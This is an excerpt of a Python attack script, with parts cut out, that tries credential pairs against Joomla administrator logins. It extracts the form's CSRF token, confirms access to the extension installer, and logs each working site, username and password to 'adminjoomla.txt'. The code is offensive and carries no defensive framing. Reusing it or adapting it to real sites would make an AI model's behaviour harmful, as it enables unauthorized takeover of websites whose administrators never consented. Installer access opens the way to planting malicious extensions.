...
def try_login(domain, username, password):
    ...
    login_url = f"{domain}/administrator/index.php"
    ...
    try:
        ...
        if "logout" in r.text.lower() or "mod_logout" in r.text.lower():
            return session, True
    except:
    ...
    try:
        ...
        token = re.search(r'name="(.*?)" value="1"', r.text)
        if not token:
            return session, False
        token_name = token.group(1)
        payload[token_name] = "1"
        r = session.post(login_url, data=payload, timeout=15, verify=False, allow_redirects=True)
        if "logout" in r.text.lower() or "mod_logout" in r.text.lower():
            return session, True
    except:
...
def check_admin(session, domain):
    try:
        r = session.get(f"{domain}/administrator/index.php?option=com_installer", timeout=15, verify=False)
        return "Installer" in r.text or "install" in r.text.lower()
    except:
        return False
    ...
    try:
        ...
        if logged_in:
            if check_admin(session, domain):
                ...
                open("adminjoomla.txt", "a", encoding="utf-8").write(f"{domain}|{user}|{passwd}\n")
            else:
